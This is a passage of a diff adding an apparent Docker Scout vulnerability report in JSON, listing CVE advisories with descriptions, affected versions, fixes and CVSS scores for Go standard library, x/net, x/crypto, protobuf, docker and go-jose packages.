+                "text": "The tokenizer incorrectly interprets tags with unquoted attribute values that end with a solidus character (/) as self-closing. When directly using Tokenizer, this can result in such tags incorrectly being marked as self-closing, and when using the Parse functions, this can result in content following such tags as being placed in the wrong scope during DOM construction, but only when tags are in foreign content (e.g. <math>, <svg>, etc contexts).\n",
+                "markdown": "> The tokenizer incorrectly interprets tags with unquoted attribute values that end with a solidus character (/) as self-closing. When directly using Tokenizer, this can result in such tags incorrectly being marked as self-closing, and when using the Parse functions, this can result in content following such tags as being placed in the wrong scope during DOM construction, but only when tags are in foreign content (e.g. <math>, <svg>, etc contexts).\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/golang.org/x/net@0.17.0                              |\n| Affected range | <0.38.0                                                         |\n| Fixed version  | 0.38.0                                                          |\n| CVSS Score     |                                                             5.3 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": "<0.38.0",
+                "cvssV3": 5.3,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+                "fixed_version": "0.38.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/net@0.17.0"
+                ],
+                "security-severity": "5.3",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24785",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24785"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8",
+              "help": {
+                "text": "If errors returned from MarshalJSON methods contain user controlled data, they may be used to break the contextual auto-escaping behavior of the html/template package, allowing for subsequent actions to inject unexpected content into templates.\n",
+                "markdown": "> If errors returned from MarshalJSON methods contain user controlled data, they may be used to break the contextual auto-escaping behavior of the html/template package, allowing for subsequent actions to inject unexpected content into templates.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.8                  |\n| Fixed version  | 1.21.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.8",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.4",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24789",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24789"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11",
+              "help": {
+                "text": "The archive/zip package's handling of certain types of invalid zip files differs from the behavior of most zip implementations. This misalignment could be exploited to create an zip file with contents that vary depending on the implementation reading the file. The archive/zip package now rejects files containing these errors.\n",
+                "markdown": "> The archive/zip package's handling of certain types of invalid zip files differs from the behavior of most zip implementations. This misalignment could be exploited to create an zip file with contents that vary depending on the implementation reading the file. The archive/zip package now rejects files containing these errors.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.11                 |\n| Fixed version  | 1.21.11                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.11",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.11",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-0913",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-0913"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10",
+              "help": {
+                "text": "os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows systems when the target path was a dangling symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL flags never follows symlinks. On Windows, when the target path was a symlink to a nonexistent location, OpenFile would create a file in that location. OpenFile now always returns an error when the O_CREATE and O_EXCL flags are both set and the target path is a symlink.\n",
+                "markdown": "> os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows systems when the target path was a dangling symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL flags never follows symlinks. On Windows, when the target path was a symlink to a nonexistent location, OpenFile would create a file in that location. OpenFile now always returns an error when the O_CREATE and O_EXCL flags are both set and the target path is a symlink.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.23.10                 |\n| Fixed version  | 1.23.10                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.23.10",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.23.10",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-48795",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-48795: Insufficient Verification of Data Authenticity"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3E%3D0.1.0%2C%3C0.17.0",
+              "help": {
+                "text": "### Summary\n\nTerrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.\n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details see [https://terrapin-attack.com](https://terrapin-attack.com). \n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.\n",
+                "markdown": "> ### Summary\n\nTerrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.\n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details see [https://terrapin-attack.com](https://terrapin-attack.com). \n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.\n\n|                |                                              |\n|----------------|----------------------------------------------|\n| Package        | pkg:golang/golang.org/x/crypto@0.14.0        |\n| Affected range | >=0.1.0,<0.17.0                              |\n| Fixed version  | 0.17.0                                       |\n| CVSS Score     |                                          5.9 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N |\n"
+              },
+              "properties": {
+                "affected_version": ">=0.1.0,<0.17.0",
+                "cvssV3": 5.9,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                "fixed_version": "0.17.0",
+                "purls": [
+                  "pkg:golang/golang.org/x/crypto@0.14.0"
+                ],
+                "security-severity": "5.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24783",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24783"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8",
+              "help": {
+                "text": "Verifying a certificate chain which contains a certificate with an unknown public key algorithm will cause Certificate.Verify to panic.\n\nThis affects all crypto/tls clients, and servers that set Config.ClientAuth to VerifyClientCertIfGiven or RequireAndVerifyClientCert. The default behavior is for TLS servers to not verify client certificates.\n",
+                "markdown": "> Verifying a certificate chain which contains a certificate with an unknown public key algorithm will cause Certificate.Verify to panic.\n\nThis affects all crypto/tls clients, and servers that set Config.ClientAuth to VerifyClientCertIfGiven or RequireAndVerifyClientCert. The default behavior is for TLS servers to not verify client certificates.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.8                  |\n| Fixed version  | 1.21.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.8",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "5.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45336",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45336"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11",
+              "help": {
+                "text": "The HTTP client drops sensitive headers after following a cross-domain redirect. For example, a request to a.com/ containing an Authorization header which is redirected to b.com/ will not send that header to b.com.\n\nIn the event that the client received a subsequent same-domain redirect, however, the sensitive headers would be restored. For example, a chain of redirects from a.com/, to b.com/1, and finally to b.com/2 would incorrectly send the Authorization header to b.com/2.\n",
+                "markdown": "> The HTTP client drops sensitive headers after following a cross-domain redirect. For example, a request to a.com/ containing an Authorization header which is redirected to b.com/ will not send that header to b.com.\n\nIn the event that the client received a subsequent same-domain redirect, however, the sensitive headers would be restored. For example, a chain of redirects from a.com/, to b.com/1, and finally to b.com/2 would incorrectly send the Authorization header to b.com/2.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.11                 |\n| Fixed version  | 1.22.11                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.11",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.22.11",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "6.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45341",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45341"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11",
+              "help": {
+                "text": "A certificate with a URI which has a IPv6 address with a zone ID may incorrectly satisfy a URI name constraint that applies to the certificate chain.\n\nCertificates containing URIs are not permitted in the web PKI, so this only affects users of private PKIs which make use of URIs.\n",
+                "markdown": "> A certificate with a URI which has a IPv6 address with a zone ID may incorrectly satisfy a URI name constraint that applies to the certificate chain.\n\nCertificates containing URIs are not permitted in the web PKI, so this only affects users of private PKIs which make use of URIs.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.11                 |\n| Fixed version  | 1.22.11                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.11",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.22.11",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "6.1",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45290",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-45290"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8",
+              "help": {
+                "text": "When parsing a multipart form (either explicitly with Request.ParseMultipartForm or implicitly with Request.FormValue, Request.PostFormValue, or Request.FormFile), limits on the total size of the parsed form were not applied to the memory consumed while reading a single form line. This permits a maliciously crafted input containing very long lines to cause allocation of arbitrarily large amounts of memory, potentially leading to memory exhaustion.\n\nWith fix, the ParseMultipartForm function now correctly limits the maximum size of form lines.\n",
+                "markdown": "> When parsing a multipart form (either explicitly with Request.ParseMultipartForm or implicitly with Request.FormValue, Request.PostFormValue, or Request.FormFile), limits on the total size of the parsed form were not applied to the memory consumed while reading a single form line. This permits a maliciously crafted input containing very long lines to cause allocation of arbitrarily large amounts of memory, potentially leading to memory exhaustion.\n\nWith fix, the ParseMultipartForm function now correctly limits the maximum size of form lines.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.21.8                  |\n| Fixed version  | 1.21.8                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.21.8",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.21.8",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "6.5",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24786",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24786: Loop with Unreachable Exit Condition ('Infinite Loop')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24786?s=github&n=protobuf&ns=google.golang.org&t=golang&vr=%3C1.33.0",
+              "help": {
+                "text": "The protojson.Unmarshal function can enter an infinite loop when unmarshaling certain forms of invalid JSON. This condition can occur when unmarshaling into a message which contains a google.protobuf.Any value, or when the UnmarshalOptions.DiscardUnknown option is set.\n",
+                "markdown": "> The protojson.Unmarshal function can enter an infinite loop when unmarshaling certain forms of invalid JSON. This condition can occur when unmarshaling into a message which contains a google.protobuf.Any value, or when the UnmarshalOptions.DiscardUnknown option is set.\n\n|                |                                                                     |\n|----------------|---------------------------------------------------------------------|\n| Package        | pkg:golang/google.golang.org/protobuf@1.31.0                        |\n| Affected range | <1.33.0                                                             |\n| Fixed version  | 1.33.0                                                              |\n| CVSS Score     |                                                                 6.6 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U |\n"
+              },
+              "properties": {
+                "affected_version": "<1.33.0",
+                "cvssV3": 6.6,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U",
+                "fixed_version": "1.33.0",
+                "purls": [
+                  "pkg:golang/google.golang.org/protobuf@1.31.0"
+                ],
+                "security-severity": "6.6",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-4673",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-4673"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-4673?s=golang&n=stdlib&t=golang&vr=%3C1.23.10",
+              "help": {
+                "text": "Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information.\n",
+                "markdown": "> Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.23.10                 |\n| Fixed version  | 1.23.10                  |\n"
+              },
+              "properties": {
+                "affected_version": "<1.23.10",
+                "cvssV3_severity": "MEDIUM",
+                "fixed_version": "1.23.10",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "6.8",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24557",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24557: Insufficient Verification of Data Authenticity"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24557?s=github&n=docker&ns=github.com%2Fdocker&t=golang&vr=%3C24.0.9",
+              "help": {
+                "text": "The classic builder cache system is prone to cache poisoning if the image is built `FROM scratch`.\nAlso, changes to some instructions (most important being `HEALTHCHECK` and `ONBUILD`) would not cause a cache miss.\n\n\nAn attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.\n\nFor example, an attacker could create an image that is considered as a valid cache candidate for:\n```\nFROM scratch\nMAINTAINER Pawel\n```\n\nwhen in fact the malicious image used as a cache would be an image built from a different Dockerfile.\n\nIn the second case, the attacker could for example substitute a different `HEALTCHECK` command.\n\n\n### Impact\n\n23.0+ users are only affected if they explicitly opted out of Buildkit (`DOCKER_BUILDKIT=0` environment variable) or are using the `/build` API endpoint (which uses the classic builder by default).\n\nAll users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.\n\nImage build API endpoint (`/build`) and `ImageBuild` function from `github.com/docker/docker/client` is also affected as it the uses classic builder by default. \n\n\n### Patches\n\nPatches are included in Moby releases:\n\n- v25.0.2\n- v24.0.9\n- v23.0.10\n\n### Workarounds\n\n- Use `--no-cache` or use Buildkit if possible (`DOCKER_BUILDKIT=1`, it's default on 23.0+ assuming that the buildx plugin is installed).\n- Use `Version = types.BuilderBuildKit` or `NoCache = true` in `ImageBuildOptions` for `ImageBuild` call.\n\n\n",
+                "markdown": "> The classic builder cache system is prone to cache poisoning if the image is built `FROM scratch`.\nAlso, changes to some instructions (most important being `HEALTHCHECK` and `ONBUILD`) would not cause a cache miss.\n\n\nAn attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.\n\nFor example, an attacker could create an image that is considered as a valid cache candidate for:\n```\nFROM scratch\nMAINTAINER Pawel\n```\n\nwhen in fact the malicious image used as a cache would be an image built from a different Dockerfile.\n\nIn the second case, the attacker could for example substitute a different `HEALTCHECK` command.\n\n\n### Impact\n\n23.0+ users are only affected if they explicitly opted out of Buildkit (`DOCKER_BUILDKIT=0` environment variable) or are using the `/build` API endpoint (which uses the classic builder by default).\n\nAll users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.\n\nImage build API endpoint (`/build`) and `ImageBuild` function from `github.com/docker/docker/client` is also affected as it the uses classic builder by default. \n\n\n### Patches\n\nPatches are included in Moby releases:\n\n- v25.0.2\n- v24.0.9\n- v23.0.10\n\n### Workarounds\n\n- Use `--no-cache` or use Buildkit if possible (`DOCKER_BUILDKIT=1`, it's default on 23.0+ assuming that the buildx plugin is installed).\n- Use `Version = types.BuilderBuildKit` or `NoCache = true` in `ImageBuildOptions` for `ImageBuild` call.\n\n\n\n|                |                                                           |\n|----------------|-----------------------------------------------------------|\n| Package        | pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible |\n| Affected range | <24.0.9                                                   |\n| Fixed version  | 24.0.9                                                    |\n| CVSS Score     |                                                       6.9 |\n| CVSS Vector    | CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L              |\n"
+              },
+              "properties": {
+                "affected_version": "<24.0.9",
+                "cvssV3": 6.9,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L",
+                "fixed_version": "24.0.9",
+                "purls": [
+                  "pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible"
+                ],
+                "security-severity": "6.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-27144",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-27144: Uncontrolled Resource Consumption"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-27144?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.4",
+              "help": {
+                "text": "### Impact\nWhen parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, \".\") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.\n\n### Patches\nVersion 4.0.5 fixes this issue\n\n### Workarounds\nApplications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.\n\n### References\nThis is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.\n",
+                "markdown": "> ### Impact\nWhen parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, \".\") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.\n\n### Patches\nVersion 4.0.5 fixes this issue\n\n### Workarounds\nApplications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.\n\n### References\nThis is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.\n\n|                |                                                                 |\n|----------------|-----------------------------------------------------------------|\n| Package        | pkg:golang/github.com/go-jose/go-jose@3.0.0#v3                  |\n| Affected range | <3.0.4                                                          |\n| Fixed version  | 3.0.4                                                           |\n| CVSS Score     |                                                             6.9 |\n| CVSS Vector    | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N |\n"
+              },
+              "properties": {
+                "affected_version": "<3.0.4",
+                "cvssV3": 6.9,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                "fixed_version": "3.0.4",
+                "purls": [
+                  "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
+                ],
+                "security-severity": "6.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2022-30635",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2022-30635"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2022-30635?s=golang&n=stdlib&t=golang&vr=%3C1.22.7",
+              "help": {
+                "text": "Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.\n",
+                "markdown": "> Calling Decoder.Decode on a message which contains deeply nested structures can cause a panic due to stack exhaustion. This is a follow-up to CVE-2022-30635.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | <1.22.7                  |\n| Fixed version  | 1.22.7                   |\n"
+              },
+              "properties": {
+                "affected_version": "<1.22.7",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.22.7",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45283",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2023-45283"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2023-45283?s=golang&n=stdlib&t=golang&vr=%3E%3D1.21.0-0%2C%3C1.21.4",
+              "help": {
+                "text": "The filepath package does not recognize paths with a \\??\\ prefix as special.\n\nOn Windows, a path beginning with \\??\\ is a Root Local Device path equivalent to a path beginning with \\\\?\\. Paths with a \\??\\ prefix may be used to access arbitrary locations on the system. For example, the path \\??\\c:\\x is equivalent to the more common path c:\\x.\n\nBefore fix, Clean could convert a rooted path such as \\a\\..\\??\\b into the root local device path \\??\\b. Clean will now convert this to .\\??\\b.\n\nSimilarly, Join(\\, ??, b) could convert a seemingly innocent sequence of path elements into the root local device path \\??\\b. Join will now convert this to \\.\\??\\b.\n\nIn addition, with fix, IsAbs now correctly reports paths beginning with \\??\\ as absolute, and VolumeName correctly reports the \\??\\ prefix as a volume name.\n\nUPDATE: Go 1.20.11 and Go 1.21.4 inadvertently changed the definition of the volume name in Windows paths starting with \\?, resulting in filepath.Clean(\\?\\c:) returning \\?\\c: rather than \\?\\c:\\ (among other effects). The previous behavior has been restored.\n",
+                "markdown": "> The filepath package does not recognize paths with a \\??\\ prefix as special.\n\nOn Windows, a path beginning with \\??\\ is a Root Local Device path equivalent to a path beginning with \\\\?\\. Paths with a \\??\\ prefix may be used to access arbitrary locations on the system. For example, the path \\??\\c:\\x is equivalent to the more common path c:\\x.\n\nBefore fix, Clean could convert a rooted path such as \\a\\..\\??\\b into the root local device path \\??\\b. Clean will now convert this to .\\??\\b.\n\nSimilarly, Join(\\, ??, b) could convert a seemingly innocent sequence of path elements into the root local device path \\??\\b. Join will now convert this to \\.\\??\\b.\n\nIn addition, with fix, IsAbs now correctly reports paths beginning with \\??\\ as absolute, and VolumeName correctly reports the \\??\\ prefix as a volume name.\n\nUPDATE: Go 1.20.11 and Go 1.21.4 inadvertently changed the definition of the volume name in Windows paths starting with \\?, resulting in filepath.Clean(\\?\\c:) returning \\?\\c: rather than \\?\\c:\\ (among other effects). The previous behavior has been restored.\n\n|                |                          |\n|----------------|--------------------------|\n| Package        | pkg:golang/stdlib@1.21.3 |\n| Affected range | >=1.21.0-0,<1.21.4       |\n| Fixed version  | 1.21.4                   |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.21.0-0,<1.21.4",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.21.4",
+                "purls": [
+                  "pkg:golang/stdlib@1.21.3"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-24784",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-24784"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-24784?s=golang&n=stdlib&t=golang&vr=%3C1.21.8",
+              "help": {
+                "text": "The ParseAddressList function incorrectly handles comments (text within parentheses) within display names. Since this is a misalignment with conforming address parsers, it can result in different trust decisions being made by programs using different parsers.\n",
